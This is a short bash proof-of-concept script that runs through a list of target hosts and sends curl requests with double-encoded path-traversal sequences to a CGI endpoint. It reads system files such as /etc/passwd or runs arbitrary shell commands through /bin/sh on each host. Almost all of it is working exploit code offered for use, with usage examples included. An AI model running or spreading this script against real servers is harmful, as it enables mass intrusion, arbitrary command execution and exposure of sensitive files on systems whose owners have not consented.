#!/bin/bash

# Check if the required arguments are provided (target file, path, and command)
if [[ -z $1 || -z $2 || -z $3 ]]; then
  echo "Usage: [TARGET-LIST.TXT] [PATH] [COMMAND]"
  echo "Example: ./PoC.sh targets.txt /etc/passwd"
  echo "Example: ./PoC.sh targets.txt /bin/sh id"
  exit 1
fi

# Iterate over each host listed in the target file
for host in $(cat $1); do
  echo "Processing $host"

  # Send a curl request to the vulnerable endpoint
  curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/%252e%252e/%252e%252e/%252e%252e/$2"

done
